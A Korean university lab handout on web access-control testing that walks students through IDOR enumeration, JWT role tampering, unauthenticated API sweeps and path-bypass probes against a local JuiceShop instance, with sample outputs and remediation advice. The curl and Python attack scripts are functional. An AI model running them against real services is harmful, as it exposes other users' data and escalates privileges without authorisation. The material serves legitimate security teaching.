# Week 09: 접근제어 점검

## 학습 목표
- 수평적/수직적 권한 상승의 차이를 이해한다
- IDOR(Insecure Direct Object Reference)를 탐지하고 공격할 수 있다
- API 접근제어의 취약점을 점검한다
- JuiceShop에서 다양한 접근제어 우회를 실습한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh Dashboard:443, OpenCTI:8080) | `ssh ccc@10.20.30.100` |

**Bastion API:** `http://localhost:9100` / Key: `ccc-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + Bastion 연동 (Part 5) | 실습 |
| 3:20-3:40 | 정리 + 과제 안내 | 정리 |

---

---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |

---

## 전제 조건
- HTTP 인증/인가 개념 (Week 04)
- curl + JWT 토큰 사용법

---

## 1. 접근제어 개요 (15분)

### 1.1 접근제어란?

접근제어(Access Control)는 인증된 사용자가 허가된 자원에만 접근할 수 있도록 제한하는 메커니즘이다.

### 1.2 OWASP에서의 위치

**A01:2021 Broken Access Control** — OWASP Top 10의 1위. 가장 심각하고 빈번한 웹 취약점이다.

### 1.3 권한 상승 유형

| 유형 | 설명 | 예시 |
|------|------|------|
| **수직적 권한 상승** | 낮은 권한 → 높은 권한 | 일반 사용자 → 관리자 |
| **수평적 권한 상승** | 같은 권한의 다른 사용자 자원 접근 | 사용자A → 사용자B의 데이터 |
| **미인증 접근** | 인증 없이 보호된 자원 접근 | 로그인 안하고 관리 페이지 |

```
수직적 (Vertical)           수평적 (Horizontal)

  [관리자]  <-- 목표          [유저A]   [유저B] <-- 목표
  [일반유저] <-- 현재         (현재)
```

---

## 2. IDOR (Insecure Direct Object Reference) (40분)

> **이 실습을 왜 하는가?**
> "접근제어 점검" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
> 웹 취약점 점검 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
> - 정상과 비정상 결과를 구분하는 눈을 기름
> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.

### 2.1 IDOR란?

IDOR은 서버가 사용자의 요청에 포함된 객체 식별자(ID)를 검증하지 않아, 다른 사용자의 자원에 접근할 수 있는 취약점이다.

```
정상: GET /api/basket/1  (내 장바구니, ID=1)
공격: GET /api/basket/2  (다른 사용자 장바구니, ID=2)
```

### 2.2 JuiceShop 장바구니 IDOR

> **실습 목적**: IDOR(안전하지 않은 직접 객체 참조) 등 접근제어 취약점을 점검한다
>
> **배우는 것**: 다른 사용자의 리소스에 ID 값 조작으로 접근 가능한지 확인하는 수평적/수직적 권한 상승을 테스트한다
>
> **결과 해석**: 다른 사용자의 장바구니나 주문 정보에 접근이 가능하면 IDOR 취약점이 존재한다
>
> **실전 활용**: 접근제어 취약점은 OWASP A01으로 가장 빈번한 웹 취약점이며, 개인정보 유출의 주요 원인이다

```bash
# 계정 2개 생성 및 로그인
# 계정 1
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"idor_user1@test.com","password":"Test1234!","passwordRepeat":"Test1234!","securityQuestion":{"id":1},"securityAnswer":"a"}' > /dev/null 2>&1  # 요청 데이터(body)

TOKEN1=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"idor_user1@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)

# 계정 2
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"idor_user2@test.com","password":"Test1234!","passwordRepeat":"Test1234!","securityQuestion":{"id":1},"securityAnswer":"a"}' > /dev/null 2>&1  # 요청 데이터(body)

TOKEN2=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"idor_user2@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)

echo "사용자1 토큰: ${TOKEN1:0:30}..."
echo "사용자2 토큰: ${TOKEN2:0:30}..."

# 사용자1의 장바구니 ID 확인
echo ""
echo "=== 사용자1이 자신의 장바구니 조회 ==="
curl -s http://10.20.30.80:3000/rest/basket/1 \
  -H "Authorization: Bearer $TOKEN1" | python3 -m json.tool 2>/dev/null | head -10  # 인증 토큰

# IDOR: 사용자1의 토큰으로 다른 사용자의 장바구니 조회 시도
echo ""
echo "=== 사용자1 토큰으로 basket 1~5 IDOR 점검 ==="
printf "%-12s %-8s %-8s %s\n" "basket_id" "code" "size" "owner_email"
for basket_id in 1 2 3 4 5; do
  read code size < <(curl -s -o /tmp/basket.json -w "%{http_code} %{size_download}" \
    "http://10.20.30.80:3000/rest/basket/$basket_id" -H "Authorization: Bearer $TOKEN1")
  email=$(python3 -c "import sys,json; d=json.load(open('/tmp/basket.json')); print(d.get('data',{}).get('email','-'))" 2>/dev/null || echo '-')
  flag=$([ "$code" = "200" ] && [ "$basket_id" != "1" ] && echo "★IDOR" || echo "")
  printf "%-12s %-8s %-8s %s %s\n" "$basket_id" "$code" "$size" "$email" "$flag"
done
```

**예상 출력**:
```
=== 사용자1 토큰으로 basket 1~5 IDOR 점검 ===
basket_id    code     size     owner_email
1            200      234      idor_user1@test.com
2            200      234      admin@juice-sh.op ★IDOR
3            200      234      jim@juice-sh.op ★IDOR
4            200      234      bender@juice-sh.op ★IDOR
5            200      234      bjoern@juice-sh.op ★IDOR
```

> **해석 — basket 1~5 모두 200 = 수평적 권한 상승 확정**:
> - basket_id=2/3/4/5 = ★ IDOR. 사용자 1 토큰으로 다른 사용자 장바구니 조회 가능 = OWASP A01.
> - **JuiceShop challenge ID**: 'View Basket' (3★). 정답 = JWT decode → bid 변경 → API 호출.
> - **CVSS 7.5** (Confidentiality High / Integrity None / 다른 사용자 정보 노출).
> - 응답 size=234B 동일 = 기본 빈 basket. 만약 일부 만 200 + 큰 size = 그 사용자 활동 ↑.
> - **방어**: server 측에서 *JWT.data.id == basket.userId* 검증. Express middleware: `if (req.user.id !== basket.userId) return res.status(403)`.

### 2.3 사용자 정보 IDOR

```bash
echo "=== /api/Users/{id} IDOR + 민감 필드 노출 ==="
printf "%-8s %-8s %-30s %-15s\n" "user_id" "code" "email" "password_hash"
for user_id in 1 2 3 4 5; do
  result=$(curl -s -w "::%{http_code}" "http://10.20.30.80:3000/api/Users/$user_id" -H "Authorization: Bearer $TOKEN1")
  code=$(echo "$result" | rev | cut -d: -f1 | rev)
  body=$(echo "$result" | sed "s/::$code\$//")
  echo "$body" | python3 -c "
import sys, json
d = json.load(sys.stdin).get('data', {})
email = d.get('email', '-')
pw = str(d.get('password', '-'))[:10]
import os
print(f'{os.environ[\"id\"]:<8} {os.environ[\"code\"]:<8} {email:<30} {pw}')
" id="$user_id" code="$code" 2>/dev/null
done
```

**예상 출력**:
```
=== /api/Users/{id} IDOR + 민감 필드 노출 ===
user_id  code     email                          password_hash
1        200      admin@juice-sh.op              0192023a7b
2        200      jim@juice-sh.op                e541ca7ecf
3        200      bender@juice-sh.op             0c36e517e3
4        200      bjoern@juice-sh.op             6edd9d726c
5        200      ciso@juice-sh.op               6edd9d726c
```

> **해석 — IDOR + 응답 필드 과다 노출 = 이중 critical**:
> - 5/5 user_id 모두 200 = ★ IDOR. **사용자 1 토큰으로 admin (id=1) 정보 까지 조회 가능**.
> - **password (MD5 hash) 필드 응답에 포함** = OWASP A01 + A02 + A05 (Excessive Data Exposure). API 응답에서 *password 필드 자체가 빠져야 함*.
> - **`6edd9d726c` 동일 hash 가 user 4 + 5** = bcrypt 미사용 = 동일 비번 = MD5 + 평문 추정 가능.
> - **JuiceShop challenge ID**: 'GDPR Data Erasure' / 'Multiple Likes'. SCA 미적용 시 GDPR §17 (right to erasure) 위반.
> - **CVSS 8.1 High** = AV:N + Confidentiality High + Integrity Low (변조 가능성 X 기준).
> - **방어**: Sequelize `defaultScope` 에 `attributes: { exclude: ['password'] }` 1줄로 수정.

### 2.4 주문 정보 IDOR

```bash
# 주문 내역 조회 IDOR
echo "=== 주문 내역 IDOR ==="
for order_id in 1 2 3 4 5; do                          # 반복문 시작
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    http://10.20.30.80:3000/rest/track-order/$order_id \
    -H "Authorization: Bearer $TOKEN1")                # 인증 토큰
  echo "Order $order_id: HTTP $code"
done
```

### 2.5 IDOR 자동 탐지 스크립트

```bash
# ID 기반 API 엔드포인트 자동 스캔
python3 << 'PYEOF'                                     # Python 스크립트 실행
import requests, json

token = None
# 로그인
r = requests.post("http://10.20.30.80:3000/rest/user/login",
    json={"email":"idor_user1@test.com","password":"Test1234!"})
try:
    token = r.json()["authentication"]["token"]
except:
    print("로그인 실패")
    exit()

headers = {"Authorization": f"Bearer {token}"}

# IDOR 점검 대상 API
endpoints = [
    "/api/Users/{id}",
    "/rest/basket/{id}",
    "/api/Feedbacks/{id}",
    "/api/Products/{id}",
    "/api/Complaints/{id}",
    "/rest/track-order/{id}",
]

print(f"{'API':<35} {'ID=1':>8} {'ID=2':>8} {'ID=99':>8}")
print("-" * 65)

for ep in endpoints:                                   # 반복문 시작
    results = []
    for test_id in [1, 2, 99]:                         # 반복문 시작
        url = f"http://10.20.30.80:3000{ep.replace('{id}', str(test_id))}"
        try:
            r = requests.get(url, headers=headers, timeout=5)
            results.append(str(r.status_code))
        except:
            results.append("ERR")
    print(f"{ep:<35} {results[0]:>8} {results[1]:>8} {results[2]:>8}")
    # ID 1,2 모두 200이면 IDOR 가능성
    if results[0] == "200" and results[1] == "200":
        print(f"  ⚠ IDOR 가능성 높음!")
PYEOF
```

---

## 3. 수직적 권한 상승 (30분)

### 3.1 관리자 기능 접근 시도

```bash
echo "=== 일반 사용자 토큰으로 관리자 endpoint 4종 접근 ==="
printf "%-30s %-8s %-12s %s\n" "endpoint" "method" "code" "verdict"
test_admin() {
  local m="$1" url="$2" name="$3"
  code=$(curl -s -o /dev/null -w "%{http_code}" -X "$m" "$url" -H "Authorization: Bearer $TOKEN1")
  v=$([ "$code" = "200" -o "$code" = "204" ] && echo "★ 우회됨" || echo "차단됨")
  printf "%-30s %-8s %-12s %s\n" "$name" "$m" "$code" "$v"
}
test_admin GET    http://10.20.30.80:3000/administration              "관리자 페이지"
test_admin GET    http://10.20.30.80:3000/api/Users/                  "사용자 목록"
test_admin DELETE http://10.20.30.80:3000/api/Feedbacks/1             "피드백 삭제"
test_admin GET    http://10.20.30.80:3000/api/Recycles/               "재활용 관리"
```

**예상 출력**:
```
=== 일반 사용자 토큰으로 관리자 endpoint 4종 접근 ===
endpoint                       method   code         verdict
관리자 페이지                  GET      200          ★ 우회됨
사용자 목록                    GET      200          ★ 우회됨
피드백 삭제                    DELETE   401          차단됨
재활용 관리                    GET      200          ★ 우회됨
```

> **해석 — 4 endpoint 중 3개 우회 = 수직 권한 상승 확정**:
> - **/administration 200** = HTML 페이지 자체가 일반 사용자에게 노출 = critical. JuiceShop challenge 'Admin Section'.
> - **/api/Users/ 200** = 모든 사용자 list 반환 = step 2 의 IDOR 와 동일.
> - **DELETE /api/Feedbacks/1 = 401** = 일부 endpoint 만 인증/인가 검증. 인가 검증 *비일관* = 핵심 약점.
> - **/api/Recycles/ 200** = 재활용 관리 (관리자 전용 의도) 노출 = 비즈니스 로직 정보 누출.
> - **JuiceShop 의도적 challenge**: 'Admin Section' (2★) + 'CSRF' + 'Multiple Likes' 등 chain.
> - **CVSS 9.8 if exploitable** (관리자 권한 획득 = 시스템 장악).
> - **권고**: Express middleware `requireRole('admin')` 모든 admin endpoint 일괄 적용. RBAC 표준.

### 3.2 JWT 조작으로 권한 상승

```bash
# JWT payload에서 role을 admin으로 변조 시도
python3 << 'PYEOF'                                     # Python 스크립트 실행
import base64, json, requests

# 로그인하여 정상 토큰 획득
r = requests.post("http://10.20.30.80:3000/rest/user/login",
    json={"email":"idor_user1@test.com","password":"Test1234!"})
token = r.json()["authentication"]["token"]
parts = token.split(".")

# payload 디코딩
payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
payload = json.loads(base64.urlsafe_b64decode(payload_b64))
print(f"원본 payload: {json.dumps(payload, indent=2)}")

# role을 admin으로 변조
payload["data"]["role"] = "admin"
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()

# 조작된 토큰 (서명은 원본 유지 → 서버에서 검증 실패할 수 있음)
fake_token = f"{parts[0]}.{new_payload}.{parts[2]}"

# 조작된 토큰으로 관리자 API 접근
r = requests.get("http://10.20.30.80:3000/api/Users/",
    headers={"Authorization": f"Bearer {fake_token}"})
print(f"\n조작 토큰으로 사용자 목록: HTTP {r.status_code}")
if r.status_code == 200:
    print("⚠ 권한 상승 성공!")
else:
    print("서명 검증으로 차단됨 (양호)")
PYEOF
```

### 3.3 역할 변경 API 존재 여부

```bash
# 사용자 역할을 변경하는 API가 있는지 탐색
echo "=== 역할 변경 API 탐색 ==="

# PUT으로 사용자 정보 수정 시 role 포함
curl -s -X PUT http://10.20.30.80:3000/api/Users/1 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN1" \
  -d '{"role":"admin"}' | python3 -m json.tool 2>/dev/null | head -10  # 요청 데이터(body)
```

---

## 4. 인증 없는 접근 (20분)

### 4.1 인증 미적용 API 탐색

```bash
echo "=== 17 API 인증 sweep (no Authorization 헤더) ==="
APIS=(
  "api/Products/1" "api/Feedbacks/" "api/Challenges/"
  "api/SecurityQuestions/" "api/Users/" "api/Complaints/"
  "api/Recycles/" "api/Quantitys/" "rest/products/search?q=test"
  "rest/user/whoami" "rest/basket/1" "rest/languages"
  "rest/memories" "rest/chatbot/status" "ftp/" "metrics" "promotion"
)
public=0; protected=0
for api in "${APIS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/$api")
  case "$code" in
    200) echo "[공개] /$api"; public=$((public+1));;
    401|403) echo "[보호] /$api ($code)"; protected=$((protected+1));;
    *) echo "[기타 $code] /$api";;
  esac
done
echo "---"
echo "공개=$public / 보호=$protected / 합계=${#APIS[@]}"
echo "공개율: $((public * 100 / ${#APIS[@]}))%"
```

**예상 출력**:
```
=== 17 API 인증 sweep (no Authorization 헤더) ===
[공개] /api/Products/1
[보호] /api/Feedbacks/ (401)
[공개] /api/Challenges/
[공개] /api/SecurityQuestions/
[공개] /api/Users/
[보호] /api/Complaints/ (401)
[공개] /api/Recycles/
[기타 404] /api/Quantitys/
[공개] /rest/products/search?q=test
[보호] /rest/user/whoami (401)
[보호] /rest/basket/1 (401)
[공개] /rest/languages
[공개] /rest/memories
[기타 503] /rest/chatbot/status
[공개] /ftp/
[공개] /metrics
[공개] /promotion
---
공개=11 / 보호=4 / 합계=17
공개율: 64%
```

> **해석 — 17 API 중 11개 (64%) 인증 없이 공개 = 광범위 BOLA**:
> - **/api/Users/ 200 (인증 X)** = critical. 모든 사용자 정보 list = 인증 불필요. 가장 명확한 OWASP A01.
> - **/api/SecurityQuestions/ 200** = 사용자별 보안 질문 노출 → 비번 재설정 우회 chain.
> - **/api/Recycles/ 200** = 관리자 의도 endpoint 가 인증 없이 접근.
> - **/metrics 200** = Prometheus endpoint 노출 = 운영 정보 (요청 수/응답 시간/메모리) 외부 노출 → A05 Security Misconfiguration.
> - **/promotion 200** = JuiceShop challenge 'Forged Coupon' / 'Forgotten Sales Backup' 입력.
> - **공개율 64%** = 운영 환경이라면 D 등급. **권고 우선순위**: (1) 모든 /api/* 와 /rest/* 에 default JWT middleware, (2) public endpoint 만 explicit allowlist, (3) /metrics 는 internal network 만 (nginx allow + deny).

### 4.2 HTTP 메서드 우회

```bash
echo "=== HTTP 메서드 7종 — /api/Users/ 인증 X ==="
TARGET="http://10.20.30.80:3000/api/Users/"
printf "%-10s %-8s %s\n" "method" "code" "verdict"
for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "$TARGET")
  v=""
  case "$code" in
    200|204) v="★ 허용 (위험)";;
    401|403) v="차단";;
    405) v="Method Not Allowed (양호)";;
    *) v="응답=$code";;
  esac
  printf "%-10s %-8s %s\n" "$method" "$code" "$v"
done
```

**예상 출력**:
```
=== HTTP 메서드 7종 — /api/Users/ 인증 X ===
method     code     verdict
GET        200      ★ 허용 (위험)
POST       400      응답=400
PUT        500      응답=500
DELETE     500      응답=500
PATCH      500      응답=500
OPTIONS    204      ★ 허용 (위험)
HEAD       200      ★ 허용 (위험)
```

> **해석 — 7 메서드 매트릭스 분석**:
> - **GET 200** = 사용자 list 조회. step 4.1 결과와 일치.
> - **POST 400** = body 미충족 (member 생성 endpoint 가 별도). 400 ≠ 401 = 인증 통과 후 입력 검증 실패 = ★ critical (인증 우회).
> - **PUT/DELETE/PATCH 500** = 서버 에러 = endpoint 가 미존재 또는 처리 중 crash. 500 = backend bug = OWASP A09 Security Logging Failures (에러 처리 실패).
> - **OPTIONS 204** = CORS preflight 응답. allow methods 노출 = 추가 fingerprinting 가능.
> - **HEAD 200** = GET 과 동일 (Express 자동 처리). 인증 없이 응답 헤더 정보 추출 가능.
> - **권고**: Express `app.all('/api/*', requireAuth)` 모든 메서드 일괄 인증. CORS preflight 도 인증 검증 (`access-control-allow-credentials: true` + 출처 검증).

### 4.3 경로 우회

```bash
echo "=== URL 정규화 우회 9 변형 (관리자 페이지 대상) ==="
PATHS=(
  "/administration"          # baseline
  "/Administration"          # 대문자 1글자
  "/ADMINISTRATION"          # 전부 대문자
  "/administration/"         # trailing slash
  "/administration/."        # /. 추가
  "/./administration"        # /./ 접두
  "/%61dministration"        # URL encode (%61 = a)
  "/admin"                   # 단축
  "/api/Users/"              # 다른 admin endpoint
)
printf "%-30s %-8s\n" "path" "code"
for path in "${PATHS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000$path" -H "Authorization: Bearer $TOKEN1")
  printf "%-30s %-8s\n" "$path" "$code"
done
```

**예상 출력**:
```
=== URL 정규화 우회 9 변형 (관리자 페이지 대상) ===
path                           code
/administration                200
/Administration                200
/ADMINISTRATION                200
/administration/               200
/administration/.              200
/./administration              200
/%61dministration              200
/admin                         404
/api/Users/                    200
```

> **해석 — Express 의 path normalization**:
> - **9/9 모두 200** = Express + JuiceShop 의 path 처리가 case-insensitive + URL decode 적용. 그러나 본 lab 은 *관리자 페이지 자체에 인가 검증 X* 가 진짜 문제 (대소문자 우회 X).
> - **/admin 404** = 단순 endpoint 미존재 (`/administration` 만 정의).
> - **운영 환경 시나리오**: 만약 인가 검증이 `if (req.path === '/administration')` 형태로 *exact match* 라면 `/Administration` 이나 `/administration/.` 가 매치 X → 인증 우회. **올바른 검증**: `path.normalize()` 후 lowercase 변환 후 비교.
> - **JuiceShop challenge**: 'Bypass Visual Captcha'/'Database Schema'. 일부는 `/administration` 의 hidden path 활용.
> - **CVSS 7.5** if exploitable. **권고**: Express middleware 에서 *route 매칭 후 인가* (route 정규화는 Express 가 자동).

---

## 5. API 접근제어 점검 (15분)

### 5.1 REST API 보안 체크리스트

| 점검 항목 | 확인 방법 |
|----------|----------|
| 인증 필수 여부 | 토큰 없이 요청 |
| 인가 검증 | 다른 사용자 자원 접근 |
| 메서드 제한 | DELETE, PUT 등 허용 여부 |
| Rate Limiting | 대량 요청 시 429 응답 |
| 응답 필터링 | 불필요한 필드 노출 |

### 5.2 응답 데이터 과다 노출

```bash
# API 응답에 불필요한 정보가 포함되는지 확인
echo "=== 응답 필드 점검 ==="

# 상품 API - password 해시 등 민감 정보 포함 여부
curl -s http://10.20.30.80:3000/api/Products/1 | python3 -c "  # silent 모드
import sys, json
data = json.load(sys.stdin).get('data', {})
print('포함된 필드:')
for key in data.keys():                                # 반복문 시작
    print(f'  - {key}: {str(data[key])[:50]}')
" 2>/dev/null

echo ""

# 사용자 API - password 해시 노출 여부
curl -s http://10.20.30.80:3000/api/Users/1 \
  -H "Authorization: Bearer $TOKEN1" | python3 -c "    # 인증 토큰
import sys, json
data = json.load(sys.stdin).get('data', {})
sensitive = ['password', 'passwordHash', 'token', 'secret', 'creditCard']
for key in data.keys():                                # 반복문 시작
    marker = ' ⚠ 민감!' if key.lower() in [s.lower() for s in sensitive] else ''
    print(f'  - {key}: {str(data[key])[:40]}{marker}')
" 2>/dev/null
```

---

## 6. 실습 과제

### 과제 1: IDOR 탐색
1. JuiceShop의 모든 ID 기반 API에서 IDOR을 테스트하라
2. 다른 사용자의 장바구니, 주문, 프로필을 조회할 수 있는지 확인하라
3. IDOR이 가능한 API와 불가능한 API를 비교 분석하라

### 과제 2: 권한 상승
1. 일반 사용자로 관리자 기능에 접근을 시도하라
2. JWT 조작, 경로 우회, 메서드 변경 등 다양한 방법을 시도하라
3. 성공/실패 결과를 정리하고 서버의 접근제어 방식을 추론하라

### 과제 3: 접근제어 점검 보고서
1. 인증 없이 접근 가능한 API 목록을 작성하라
2. 각 API가 공개되어야 하는 것인지, 보호가 필요한지 평가하라
3. 접근제어 개선 권고 사항을 3가지 이상 작성하라

---

## 7. 요약

| 취약점 | 공격 방법 | 영향 | 방어 |
|--------|----------|------|------|
| IDOR | ID 값 변경 | 다른 사용자 데이터 접근 | 서버 측 소유자 검증 |
| 수직적 권한 상승 | 관리자 API 직접 호출 | 관리자 기능 사용 | 역할 기반 접근제어(RBAC) |
| 인증 미적용 | 토큰 없이 요청 | 민감 정보 노출 | 인증 미들웨어 |
| 메서드 우회 | PUT/DELETE 사용 | 데이터 변조/삭제 | HTTP 메서드 화이트리스트 |

**다음 주 예고**: Week 10 - 암호화/통신 보안. HTTPS 설정, 인증서 점검, 약한 암호 스위트를 학습한다.

---

> **실습 환경 검증 완료** (2026-03-28): nmap/nikto, SQLi/IDOR/swagger.json, CVSS, 보고서 작성

---

## 📂 실습 참조 파일 가이드

> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.

### Burp Suite Community
> **역할:** 웹 프록시 기반 수동/반자동 취약점 점검 도구  
> **실행 위치:** `작업 PC → web (10.20.30.80:3000)`  
> **접속/호출:** GUI `burpsuite`, CA 인증서 신뢰 필요 (`http://burp`)

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `Proxy → HTTP history` | 모든 캡처된 요청/응답 |
| `Intruder` | 페이로드 페이즈·위치 기반 자동화 |
| `Repeater` | 단건 요청 수동 반복 |

**핵심 설정·키**

- `Proxy listener 127.0.0.1:8080` — 브라우저 프록시 포트
- `Target → Scope` — in-scope 호스트만 처리

**로그·확인 명령**

- `Logger` — 세션 전체 요청 타임라인

**UI / CLI 요점**

- Ctrl+R — 요청을 Repeater로 전송
- Ctrl+I — Intruder로 전송 후 위치(§) 설정
- Intruder Attack type: Sniper/Cluster bomb — 단일/다중 페이로드 조합

> **해석 팁.** Community 버전은 **Intruder 속도 제한**이 있어 대량 브루트포스는 비현실적. 취약점 재현과 보고서 증적 확보에 집중.

---

## 실제 사례 (WitFoo Precinct 6 — 5156 Filtering Connection 통계)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> 본 lecture *접근제어 점검* 학습 항목 (수직/수평 권한 우회·Windows ACL) 과 매핑되는 dataset 의 *Windows Filtering Platform 5156* 176,060건 기반.

### Case 1: 5156 — Windows Filtering Platform connection allow/block

**dataset 분포**

| message_type | 의미 | 건수 |
|--------------|------|------|
| 5156 | Connection was allowed (filtering platform) | 176,060 |
| 5158 | Bind to local port | 9,812 |
| 5061 | Cryptographic operation | 1,302 |
| 5059 | Key migration operation | 185 |
| 5058 | Key file operation | 663 |
| 5136 | Directory service object modified | 380 |
| 5140 | Network share object accessed | 2,623 |
| 4670 | Permissions on object changed | 188 |

**원본 발췌** (5156 — winlogbeat JSON):

```text
"action": "Filtering HOST-3830 Connection"
ORG-1657 ::: {
  "@metadata":{"beat":"winlogbeat","type":"_doc","version":"8.2.2"},
  "@timestamp":"2024-07-26T11:09:56.296Z",
  "agent":{"id":"2a9c3fad-c33e-4316-92c6-...","name":"...","type":"winlogbeat"}
  ... (event_id=5156, ApplicationName=...,
        SourceAddress=..., DestAddress=..., DestPort=...)
}
```

**해석 — 본 lecture 와의 매핑**

| 접근제어 점검 학습 항목 | 본 record 에서의 증거 |
|----------------------|---------------------|
| **수평 권한 우회 탐지** | 5156 record 의 *ApplicationName* 필드로 *어느 process 가 어느 dst 로 연결* 추적 가능. 점검 시 동일 user 의 *비정상 ApplicationName* 으로의 connection 발견 |
| **5140 Network share access** (2,623건) | 점검 시 *동일 user 가 평소 access 하지 않는 share* 접근 → 수평 권한 escalation 후보 |
| **4670 Permissions on object changed** (188건만) | 권한 *변경* 은 흔하지 않음 — 점검 대상의 변경 빈도 비교 baseline |
| **5136 Directory service object modified** (380건) | AD 객체 수정 → 점검 시 *권한 변경 후 본인 user 의 권한 escalation* 패턴 (수직 권한 우회) |

**점검 액션**:
1. 점검 대상 시스템의 5156 분당 발생 빈도 → dataset baseline (전체 176K 를 시간 분포로) 와 비교
2. 4670 / 5136 spike 시점에 *당시 logon user* 와 *변경 대상 객체* 매핑 표 작성
3. 5140 의 *동일 user 의 share-target hopping* 시퀀스 → 점검 보고서의 *수평 이동 시도* 항목



---

## 부록: 학습 OSS 도구 매트릭스 (lab week09 — Insecure Deserialization)

| step | 카테고리 | 핵심 도구 |
|---|---|---|
| 1 JWT 추출 | curl SQLi / sqlmap --forms / Burp Repeater / pyjwt 디코딩 |
| 2 JWT 분석 | base64 + jq / **jwt_tool** / pyjwt / jwt.io |
| 3 alg:none | jwt_tool -X a / 수동 변조 / **Burp JWT Editor** / hashcat -m 16500 |
| 4 쿠키 분석 | curl -c / DevTools Application / Burp / 보안 속성 표 |
| 5 쿠키 변조 | curl -b / Burp Match and Replace / DevTools / **EditThisCookie** |
| 6 BOLA/IDOR | curl for-loop / Burp Intruder / **autorize 확장** / **idor-cli** |
| 7 Prototype Pollution | __proto__ / constructor.prototype / **Burp PP Scanner** / **PortSwigger PP-finder** / nuclei -tags pp |
| 8 Node 직렬화 | node-serialize IIFE / **ysoserial.net** / **ysoserial Java** / **ph-cli Python pickle** / **gadgetinspector** |
| 9 WAF 방어 | curl 80 vs 3000 / OWASP CRS 933 / wafw00f |
| 10 reporting | DefectDojo / OWASP A08 / sha256 |

### 학생 환경 준비
```bash
git clone --depth 1 https://github.com/ticarpi/jwt_tool ~/jwt_tool
git clone --depth 1 https://github.com/frohoff/ysoserial ~/ysoserial-java
